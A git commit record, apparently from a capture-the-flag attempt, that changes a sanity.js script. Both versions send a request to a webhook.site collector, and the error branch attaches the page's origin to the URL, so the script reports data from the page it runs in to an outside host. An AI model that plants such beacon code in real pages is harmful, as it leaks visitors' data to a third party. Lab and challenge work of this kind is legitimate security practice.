0fa93b9544ac591f5e87c19696e1d1331fa0f6d9
codefeasto <87825522+codefeasto@users.noreply.github.com>
2023-08-17 13:38:30 +0300

    Update sanity.js

--- sanity.js
+++ sanity.js
@@ -1,6 +1,6 @@
 try{
-  var a = await fetch("https://1bba152fa531f3b03766f402-1024-diff-the-patch.challenge.master.camp.allesctf.net:31337/")
+  fetch("https://webhook.site/695fb972-c378-4986-b7af-0e8080af2eb8?kek",{"mode":"cors"});
 }catch(err){
-  await  fetch("https://webhook.site/695fb972-c378-4986-b7af-0e8080af2eb8?"+err+document.location.origin,{"mode":"cors"});
+  fetch("https://webhook.site/695fb972-c378-4986-b7af-0e8080af2eb8?"+err+document.location.origin,{"mode":"cors"});
 }
   
